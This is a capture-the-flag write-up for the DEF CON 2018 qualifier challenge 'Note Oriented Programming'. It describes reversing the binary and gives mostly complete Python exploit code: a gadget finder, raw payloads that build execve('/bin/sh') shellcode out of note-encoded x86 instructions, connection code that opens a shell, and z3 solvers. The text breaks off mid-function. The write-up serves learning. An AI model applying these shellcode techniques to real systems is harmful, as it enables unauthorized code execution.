Note Oriented Programmig
------------------------
We had remote access to the challenge and we've been provided with the executable `nop`.  
We could only insert some integer values that after certain operations became strings representing notes and octaves. We could execute 'notes' from `A0` to `G#8`.
Seems like we have to craft a musical shellcode!


### Reversing 

The program allocates two sections at `0x40404000`, and `0x60606000`:  
It will store the user input in the first section -that we will call `USER_INPUT`- and a set of musical notes expressed in alphabetical notation in the latter -that we will call `CODE` as the program will jump to it to 
play our song-.

```
0x40404000 0x40405000 rw-p     1000 0
0x565a6000 0x565a7000 r-xp     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a7000 0x565a8000 r--p     1000 0      /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x565a8000 0x565a9000 rw-p     1000 1000   /home/mhackeroni/ctf/defconquals18/nop/nop                         
0x60606000 0x60608000 rwxp     2000 0
```

After reading the user input, it will starts processing it by reading a word at a time, and translate each word into the a set of notes (e.g., G#0, B7)
into the `CODE` section: the program will stop parsing notes at the first `\xff\xff`, but will stop reading our inputs at the first `\x00\x00`: an extremely
valuable *feature* allowing us to have an unconstrained user input at a specific location.

Before the shellcode, the program puts a small stub that cleans useful registers, and copies `ESP` in `ESI` and `EDI`. An `int 80` will be concatenated at the end of our code.


### Shellcoding

Our first aim was to retrieve a list of all the instructions we could use. We combined several notes and disassembled them with capstone in order to have some useful "gadget" to build the shellcode.  

```python
from math import log             
from collections import defaultdict                               
from capstone import *           
import itertools                 
import re                        

fmin = 27                        
fmax = 26590                     

notes_array = ['A', 'A#', 'B', 'C', 'C#', 'D', 'D#', 'E', 'F', 'F#', 'G', 'G#']                                                      


def tonote(freq):                
    v3 = log(float(freq) / 27.5, 2) * 12.0 + 0.5;                 
    v3 = int(v3)                 
    note = "%s%d" % (notes_array[v3 % 12], (v3 / 12));            
    return note                  

gadgets = defaultdict(list)      
gadgets_reverse = defaultdict(list)                               

for f in range(fmin, fmax):      
    gadgets[tonote(f)].append(f) 
    gadgets_reverse[f].append(tonote(f))                          


md = Cs(CS_ARCH_X86, CS_MODE_32) 
baseaddr = 0x60606000            


def disasm(code, address):       
    instructions = ''            
    regex = r'ptr \[e[bcd]x'     
    size = 0                     
    for i in md.disasm(code, address):                            
        size += i.size           
        instructions += '%s %s; ' % (i.mnemonic, i.op_str)        
        if re.findall(regex, i.op_str):                           
            return None          

    if size != len(code):        
        return None              

    return instructions          

instructions = defaultdict(dict) 
for k in itertools.combinations(gadgets.keys(), 3):               
    ins = disasm(''.join(k), baseaddr)                            
    if ins is None:              
        continue                 
    print '\'%s\'    #%s' % (''.join(k), ins)                     

for k in instructions.keys():    
    for l in instructions[k].keys():                              
        print "%s %s" % (k, l)   
```

There are no `mov` nor `push` and `pop` gadgets, only a few `inc`, some `xor`, and a couple `and`.  
Unfortunately, the only control we excert over `esi` and `edi` is via the `and` instruction, like:
```
169:'G6A#0'    #inc edi; inc ecx; and esi, dword ptr [eax];                                                            
170:'G6A#7'    #inc edi; inc ecx; and esi, dword ptr [edi];   
```

Although we were able to write bytes into the stack, the biggest problem for us was to write the right address into the right register so to call another `read()` or an `execve()`.  

Since we weren't provided with enough instructions to set the registers like `ecx` and `ebx`, we all agreed on the fact that our exploit had to be done in two stages and that
the first stage had to change bytes in the `CODE` section.   
We all decided to use a mask like `0x6060ff0` to make `esi` point to our `CODE` section, and used it to xor the instruction we needed into our NOP sled. Challenging ASLR will make our exploits not 100% reliable.  
Oh, and since we are tough guys, we went straight for an `execve()`.


### Three different Exploits

At a certain point in the night we realized we could write (`\x00\x00` excluded for obviuos reasons) every byte we wanted between `\xff\xff` and `\x00\x00` in the `USER_INPUT` section.  
That's when we started coming up with different ideas. We split in three and developed three different working exploits.  
One exploit was based on the use of the stack, the other two took advantage of the `USER_INPUT` section.  

In order to set eax and al to the desired values we wrote a clever solver in z3 that used values that could be found in the stack.

#### First Exploit

The first idea was to xor values on the stack to write the mask, `/bin//sh`, and `mov ebx, edi`. Then we would set `edi` to point to `/bin//sh` and write the byte for  `mov ebx, edi` into the nop sled.

```python
from pwn import *

############### IDEA ################

#We want to change part of the stack in this way

#Before

# OOOOOOOOOOOO---- Welcome to Note Oriented Programming!! ----OOOOOOOOOOOOOOOOOOOO

#After 

# OOOOOOOOOOOO---- Welcome to Note O\x00\x65\x60\x60ted Progra/bin//sh\x00---\x89\xfb\x90 OOOOOOOOOOOOOOOOO

#And between 0x60606500 and esi (may ASLR be with us)
#Set edi to point to /bin//sh
#Change the first 4 byte of the new esi pointer into 89fb(mov ebx, edi)
#Finally set the value of eax to 0xb and place useless instructions in order to change a part of them with the mov.

#Writing /bin//sh

payload = "\x30\x00\x2b\x00" * 43
payload += "\x3b\x02\x1e\x00\x36\x5f"  
payload += "\xfa\x02\x78\x00\x36\x5f"
payload += "\x24\x00\x36\x5f"
payload += "\x2b\x00\x2b\x00" * 25
payload += "\xaa\x00\x2b\x00"
payload += "\x3b\x02\xb8\x1a\x36\x5f\x3b\x02\xfe\x1d\x36\x5f"
payload += "\x8f\x00\xce\x17"
payload += "\x24\x00\x36\x5f\xbf\x00\x9b\x2f"
payload += "\x36\x5f\xbf\x00"
payload += "\x36\x5f\xbf\x00"
payload += "\x8f\x00\x9b\x0a"
payload += "\xfa\x02\xfb\x3b\x36\x5f"
payload += "\xfa\x02\x54\x47\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\x30\x00\x36\x5f"
payload += "\x3b\x02\xd3\x54\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x2b\x00"
payload += "\x8f\x00\x54\x01"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x30\x00\xce\x17"
payload += "\xd3\x54\x36\x5f" * 11
payload += "\x8f\x00\xd3\x54"
payload += "\xfa\x02\x70\x35\x36\x5f"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\x8f\x00\x9b\x2f"
payload += "\x30\x00\xe7\x0b"


#Writing 0x60606500

payload += "\x8f\x00\x9b\x2f"
payload += "\x8f\x00\xa7\x02"
payload += "\x24\x00\xa7\x02"
payload += "\x8f\x00\x60\x00"
payload += "\x8f\x00\x2b\x00"
payload += "\x3b\x02\xd3\x54\x36\x5f"
payload += "\x24\x00\xaa\x00"
payload += "\x8f\x00\xf4\x05"
payload += "\x8f\x00\xaa\x00"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\xfa\x02\xfb\x3b\x36\x5f"
payload += "\x8f\x00\x55\x00"
payload += "\x24\x00\x55\x00"
payload += "\x8f\x00\x4e\x05"
payload += "\xfa\x02\x8c\x3f\x36\x5f"
payload += "\xfa\x02\x10\x50\x36\x5f"
payload += "\x8f\x00\xaa\x00"
payload += "\x24\x00\xa7\x02"
payload += "\x24\x00\xaa\x00"
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x9b\x0a"
payload += "\x24\x00\xaa\x00"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\x9b\x0a"
payload += "\x8f\x00\xa7\x02"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\x54\x01"


#Writing 89, bf and 90

payload += "\xbf\x00\xf4\x05"
payload += "\x24\x00\xf4\x05"
payload += "\x24\x00\xe7\x0b"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x9b\x2f"
payload += "\x8f\x00\x41\x01"
payload += "\x24\x00\xf4\x05"
payload += "\x24\x00\xe7\x0b"
payload += "\x24\x00\xce\x17"
payload += "\x8f\x00\x41\x01"
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x30\x00"
payload += "\x3b\x02\x8c\x3f\x36\x5f"
payload += "\x3b\x02\x70\x35\x36\x5f"
payload += "\x8f\x00\x4e\x05"
payload += "\x24\x00\xf4\x05"
payload += "\x8f\x00\x4e\x05"
payload += "\x3b\x02\x8c\x3f\x36\x5f"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x24\x00\xe7\x0b"
payload += "\xd3\x54\x36\x5f" * 6
payload += "\x8f\x00\x4e\x05"
payload += "\x3b\x02\x70\x35\x36\x5f"
payload += "\x3b\x02\x10\x50\x36\x5f"
payload += "\x24\x00\xce\x17"
payload += "\xd3\x54\x36\x5f"
payload += "\x8f\x00\x4e\x05"


#Inc ESI

payload += "\xd3\x54\x36\x5f" * 41


#AND with ESI

payload += "\x3c\x0b"
payload += "\x54\x47\x36\x5f"


#Clearing 4 values pointed by ESI

payload += "\x8f\x00\x2b\x00"
payload += "\x24\x00\x2b\x00" #0
payload += "\x24\x00\xaa\x00" #2
payload += "\x8f\x00\xa7\x02"
payload += "\x8f\x00\x55\x00" #1
payload += "\x24\x00\x55\x00" #1
payload += "\x8f\x00\x4e\x05" #5
payload += "\x8f\x00\x54\x01" #3
payload += "\x24\x00\x54\x01" #3
payload += "\x8f\x00\x35\x15" 


#Inserting 89 bf 90 90

payload += "\x8f\x00\xf4\x05"
payload += "\x24\x00\x2b\x00"
payload += "\x8f\x00\xf4\x05"
payload += "\x8f\x00\xe7\x0b"
payload += "\x24\x00\x55\x00"
payload += "\x8f\x00\xe7\x0b"
payload += "\x8f\x00\xce\x17"
payload += "\x24\x00\xaa\x00"
payload += "\x24\x00\x54\x01"
payload += "\x8f\x00\xce\x17"


#Setting eax

payload += "\x8f\x00\x36\x5f"
payload += "\x3b\x02\x54\x47\x36\x5f"


#Setting edx

payload += "\x36\x5f\x36\x5f" * 41


#Padding
payload += "\x54\x47\x36\x5f" * 250


#Terminator

payload += "\x00\x00"


def solve_pow(s, n):
        with context.local(log_level='warning'):
                r = remote('our_1337_server', 13337)
                r.sendline(s + ' ' + str(n))
                res = r.recvline().strip()
                r.close()
        return res

def connect():
        r = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
        r.recvuntil('Challenge: ')
        chall_s = r.recvline().strip()
        r.recvuntil('n: ')
        chall_n = int(r.recvline().strip())
        r.sendline(solve_pow(chall_s, chall_n))
        return r

while 1:
    try:
        #conn = connect()
        conn = remote("127.0.0.1", 4000)
        conn.recvuntil("How does a shell sound?")
        conn.send(payload)
        conn.interactive()
    except EOFError:
        conn.close()
```


#### Second Exploit

The second idea was to write the mask and `/bin/sh\0` in the `USER_INPUT` after `\xff\xff`. We would set `al` to the desired byte through xoring it with bytes on the stack via `edi` and xor al back into our nop sled pointed by `esi`.
This way we craft a shellcode in our nop sled.  

```python
from pwn import *

shellcode = ""
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("nop")
shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 0xb")
shellcode += asm("mov ebx, 0x40404e7c")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")
shellcode += asm("int 0x80")

# host = "127.0.0.1"
# port = 4000
host = '4e6b5b46.quals2018.oooverflow.io'
port = 31337

MASK = 0x60606ff0
NOP = "F3F3" #: ["inc esi", "xor eax, dword ptr [esi + 0x33]"]

n_to_f = {'G#1': 101, 'G#0': 51, 'G#3': 404, 'G#2': 202, 'G#5': 1614, 'G#4': 807, 'G#7': 6456, 'G#6': 3228, 'G#9': 25823, 'G#8': 12912, 'G7': 6094, 'G6': 3047, 'G5': 1524, 'G4': 762, 'G3': 381, 'G2': 191, 'G1': 96, 'G0': 48, 'G9': 24374, 'G8': 12187, 'D#8': 9673, 'D#9': 19346, 'D#6': 2419, 'A8': 6840, 'B4': 480, 'B5': 960, 'B6': 1920, 'B7': 3839, 'B0': 30, 'B1': 60, 'B2': 120, 'B3': 240, 'B8': 7678, 'B9': 15355, 'F#0': 45, 'F#1': 90, 'F#2': 180, 'F#3': 360, 'F#4': 719, 'F#5': 1438, 'F#6': 2876, 'F#7': 5752, 'F#8': 11503, 'F#9': 23006, 'E9': 20496, 'E8': 10248, 'E5': 1281, 'E4': 641, 'E7': 5124, 'E6': 2562, 'E1': 81, 'E0': 41, 'E3': 321, 'E2': 161, 'A#3': 227, 'A#2': 114, 'A#1': 57, 'A#0': 29, 'A#7': 3624, 'A#6': 1812, 'A#5': 906, 'A#4': 453, 'A#9': 14493, 'A#8': 7247, 'C9': 16268, 'C8': 8134, 'C3': 255, 'C2': 128, 'C1': 64, 'C0': 32, 'C7': 4067, 'C6': 2034, 'C5': 1017, 'C4': 509, 'F0': 43, 'F1': 85, 'F2': 170, 'F3': 340, 'F4': 679, 'F5': 1358, 'F6': 2715, 'F7': 5429, 'F8': 10858, 'F9': 21715, 'A1': 54, 'A0': 27, 'A3': 214, 'A2': 107, 'A5': 855, 'A4': 428, 'A7': 3420, 'A6': 1710, 'A9': 13680, 'D#7': 4837, 'D#4': 605, 'D#5': 1210, 'D#2': 152, 'D#3': 303, 'D#0': 38, 'D#1': 76, 'C#9': 17235, 'C#8': 8618, 'C#5': 1078, 'C#4': 539, 'C#7': 4309, 'C#6': 2155, 'C#1': 68, 'C#0': 34, 'C#3': 270, 'C#2': 135, 'D8': 9130, 'D9': 18260, 'D6': 2283, 'D7': 4565, 'D4': 571, 'D5': 1142, 'D2': 143, 'D3': 286, 'D0': 36, 'D1': 72}

def encoder(note):
    r = ""
    i = 0
    while i < len(note):
        if i+2 <= len(note) and note[i:i+2] in n_to_f:
            r += p16(n_to_f[note[i:i+2]])
            i += 2
        elif i+3 <= len(note) and note[i:i+3] in n_to_f:
            r += p16(n_to_f[note[i:i+3]])
            i += 3
        else: raise RuntimeError("fuuuuuuuuuuuuuuuck "+str(i))
    return r



def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

payload = ""

# set eax to 0x40404e78 -> 0x60607bf7
payload += encoder("".join(['G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'G8', 'G5', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'E8', 'G0', 'D5', 'D2', 'C7', 'D5', 'D4', 'C3', 'D5', 'D4', 'F6', 'D5', 'B0', 'B4', 'D5', 'A4', 'A4', 'D5', 'E0', 'D1', 'B3', 'G3', 'B3', 'G7']))
# B6C#0" : ["inc edx", "inc ebx", "n esi, dword ptr [eax]"] < questo per l'and con la maschera
payload += encoder("B6A#0")

# esi alignement
# F8F0 : ["inc esi", "cmp byte ptr [esi + 0x30], al"]
payload += encoder("F8F0")*3

#### COPYING THE SHELLCODE INTO THE NOP SLED

# Set al 0xa3
payload += encoder("".join(['B3', 'G5', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xd6
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

#Set al 0xa3
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0xd6
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x2
payload += encoder("".join(['D5', 'G6', 'E4', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x86
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'D5', 'E0', 'D9', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x83
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


# Set al 0x4d
payload += encoder("".join(['B3', 'G1', 'B3', 'G6', 'B3', 'G7', 'B3', 'G8', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x88
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'D5', 'B4', 'G5', 'B3', 'G3', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x3a
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G3', 'B3', 'G8', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x7d
payload += encoder("".join(['D5', 'G6', 'E4']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x06
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G0', 'B3', 'G4', 'B3', 'G6', 'B3', 'G7', 'B3', 'G9']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x73
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'E0', 'D9', 'B3', 'G4', 'B3', 'G5', 'B3', 'G6', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x77
payload += encoder("".join(['B3', 'G5', 'B3', 'G6', 'B3', 'G8', 'B3', 'G9']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xfa
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x77
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G6', 'B3', 'G7', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xe1
payload += encoder("".join(['D5', 'G6', 'E4', 'D5', 'B4', 'G5', 'B3', 'G9', 'A2', 'E3']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0x8b
payload += encoder("".join(['D5', 'G6', 'E4', 'B3', 'G5']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")

# Set al 0xb3
payload += encoder("".join(['D5', 'B4', 'G5', 'B3', 'G5', 'B3', 'G7']))
# Write on shellcode and inc esi to write next byte
# F0F0 : ["inc esi", "xor byte ptr [esi + 0x30], al"];
payload += encoder("F0F0")


print len(payload)

payload += encoder(NOP)*(2260/4 - 1)

payload += "\xff\xff"

payload += p32(MASK)

payload += "/bin/sh"

payload += p64(0x0)

print "PAYLOAD LEN:", len(payload)

def solve_pow(s, n):
        with context.local(log_level='warning'):
                r = remote('our_1337_server', 13337)
                r.sendline(s + ' ' + str(n))
                res = r.recvline().strip()
                r.close()
        return res

def connect():
        r = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
        r.recvuntil('Challenge: ')
        chall_s = r.recvline().strip()
        r.recvuntil('n: ')
        chall_n = int(r.recvline().strip())
        print 'solving pow %s %d' % (chall_s, chall_n)
        r.sendline(solve_pow(chall_s, chall_n))
        return r

i = 0
done = False
while not done:
    try:
        conn = connect()
        #conn = remote("127.0.0.1", 4000)
        conn.recvuntil("sound?")
        conn.send(payload)
        conn.interactive()
    except:
        conn.close()
        pass
```


### Third Exploit

The third idea requires to carefully craft a copy primitive via `xor` instructions, and use the available instructions considering whether you have both a read and write gadget where needed, turns out we need to employ `edi` as "source" register and `esi` as a "destination" register. We can set the masks accordingly by  using just two gadgets. The shellcode in the `USER_INPUT` section will get copied via the xor instructions.
If we spray enough (that's why we choose a 3 byte NOP (e.g. G#0) we can craft the masks requiring us only 5 bits, making the exploit feasible.

```python
#from romanpwn import *
from pwn import *
from capstone import *
from z3 import *
import struct
import itertools

val_static = [0, 927150662, 927150660, 0, 927150658, 860042308, 944191811, 910570564, 893728833, 876752962, 0, 876688449, 1110451014, 876951111, 826552389, 960770117, 893858882, 0]

# 1178149703
# 1178149700
# 1177690945
# 1110451014
# 591870278 fanno casini (aaa)

vals = val_static + [
0x4f4f4f4f, # esp + 0x38
0x2d2d2d2d, # esp + 0x40
0x57202d2d, # esp + 0x42
0x6c655720, # esp + 0x44
0x636c6557, # esp + 0x45
0x6f636c65, # esp + 0x46
0x656d6f63, # esp + 0x48
0x20656d6f, # esp + 0x49
0x7420656d] # esp + 0x4a

offsets = {
    0x4f4f4f4f: 0,
    0x2d2d2d2d: 0x8,
    0x57202d2d: 0xa,
    0x6c655720: 0xc,
    0x636c6557: 0xd,
    0x6f636c65: 0xe,
    0x656d6f63: 0x10,
    0x20656d6f: 0x11,
    0x7420656d: 0x12
}

def set_eax(eax_val, tolerance=0xfff):
    # NB assumes edi was not changed!
    solver = Solver()
    l = []
    exp = None
    for i in range(len(vals)):
        temp = BitVec('b'+str(i), 32)
        l.append(temp)
        solver.add(Or(temp == 0, temp == 0xffffffff))
        if exp is not None:
            exp = exp ^ (vals[i] & temp)
        else:
            exp = (vals[i] * temp)

    solver.add(exp >= eax_val)
    solver.add(exp <= eax_val + tolerance)
    if solver.check() == unsat:
        print 'UNSAT'
    m = solver.model()

    res = 0
    for i in range(len(vals)):
        if not m[l[i]] == 0:
            # print(hex(vals[i]))
            res ^= vals[i]
    print "Address found:", hex(res)
    #assert res == eax_val 

    shellcode = []
    for i in range(18):
        if not m[l[i]] == 0:
            # NB increases esp
            temp = struct.pack('<L', vals[i])
            shellcode += ['D5', temp[:2], temp[2:]]

    incs = 0
    for i in range(18, 27):
        if not m[l[i]] == 0:
            while incs < offsets[vals[i]]:
                shellcode += ['G8', 'G0']  # inc edi
                incs += 1
            shellcode += ['B3', 'G8']

    return shellcode

#print set_eax(0x40404a4b)

def set_al(al_val, prev_value=0, position=0):
    bytelist = [178, 201, 245, 108, 132, 152, 174, 200, 223, 234, 252, 10, 21, 205, 226, 243, 56, 67, 121, 207, 238, 2, 18, 59, 156, 234, 102, 134, 149, 162, 182, 152, 191, 222, 246, 5, 22, 63, 94, 131, 139, 156, 209, 231, 26, 163, 202, 73, 111, 146, 163, 217, 235, 103, 130, 192, 222, 243, 16, 59, 68, 89, 108, 131, 158, 197, 14, 41, 61, 194, 227, 0, 32, 64, 33, 0, 16, 255]

    big_vals = {
        0x46: 0x37433246,
        0x44: 0x37433244,
        0x42: 0x37433242,
        0x43: 0x38473943,
        0x41: 0x35453841,
        0x47: 0x34453647,
        0x45: 0x31443045,
    }

    dvals = {65: ['D5', 'A8', 'E5'],
         66: ['D5', 'B2', 'C7'],
         67: ['D5', 'C9', 'G8'],
         68: ['D5', 'D2', 'C7'],
         69: ['D5', 'E0', 'D1'],
         70: ['D5', 'F2', 'C7'],
         71: ['D5', 'G6', 'E4'],     
        #0x40: ['B6', 'B2', 'E1'], # 0x31
        #0xe5: ['B6','B2', 'E2'],  # 0x32
        #0xf7: ['B6','B2', 'E3'],  # 0x33
        #0xff: ['B6','B2', 'E4'],  # 0x34
       # 0x69: ['B6','B2','E9']    # 0x39
    }
    vals = [x for x in dvals]

    ebpgadgets = [['G2', 'E' + str(i)] for i in (0, 4, 8)]
    incebp = ['E5', 'E4', 'C6', 'E5', 'E4', 'C6']

    steps = 0
    shellcode = []
    if position == 0:
        for _ in range(144 / 2):
            shellcode += incebp
        position = 144

    while position < (len(bytelist) * 4) + 144:
        available_bits = bytelist[(position-144)/4:(position-144)/4+3]
        #print(available_bits)
        tempvals = vals + available_bits
        #print(tempvals)
        solver = Solver()
        l = []
        exp = None
        for i in range(len(tempvals)):
            temp = BitVec('b'+str(i), 8)
            l.append(temp)
            solver.add(Or(temp == 0, temp == 0xff))
            if exp is not None:
                exp = exp ^ (tempvals[i] & temp)
            else:
                exp = (tempvals[i] & temp)

        solver.add(exp == (al_val ^ prev_value))
        solver.check()

        try:
            m = solver.model()

            for i in range(len(vals)):
                if not m[l[i]] == 0:
                    print('cons', hex(vals[i]))
                    # NB increases esp
                    shellcode += dvals[vals[i]]
            for i in range(len(tempvals) - len(vals)):
                if not m[l[len(vals) + i]] == 0:
